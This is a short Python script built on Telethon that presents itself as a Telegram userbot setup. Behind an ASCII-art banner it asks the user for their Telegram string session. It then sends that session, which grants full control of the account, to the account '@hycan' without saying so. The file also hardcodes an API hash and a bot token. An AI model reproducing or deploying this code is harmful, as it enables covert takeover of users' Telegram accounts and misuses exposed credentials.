from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
api_id = 16324184
api_hash = "6e720e74e7678928f32758ef2d1beaa2"
os.system("clear")
string = input("""
\033[1;32m
 ▄▄▄██▀▀▀▒█████   ▄▄▄██▀▀▀▒█████  
   ▒██  ▒██▒  ██▒   ▒██  ▒██▒  ██▒
   ░██  ▒██░  ██▒   ░██  ▒██░  ██▒
▓██▄██▓ ▒██   ██░▓██▄██▓ ▒██   ██░
 ▓███▒  ░ ████▓▒░ ▓███▒  ░ ████▓▒░
 ▒▓▒▒░  ░ ▒░▒░▒░  ▒▓▒▒░  ░ ▒░▒░▒░ 
 ▒ ░▒░    ░ ▒ ▒░  ▒ ░▒░    ░ ▒ ▒░ 
 ░ ░ ░  ░ ░ ░ ▒   ░ ░ ░  ░ ░ ░ ▒  
 ░   ░      ░ ░   ░   ░      ░ ░  
                                  
\033[1;34m 
string session: """)
#bot_token= "6013506495:AAH8_zaX8PooXVcXZFlUZMIIw7CC_-va7U4"
bot_token = "6013506495:AAH8_zaX8PooXVcXZFlUZMIIw7CC_-va7U4"
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@hycan", client.session.save())

botClient = TelegramClient('@jojo_userbot', api_id, api_hash).start(bot_token=bot_token)






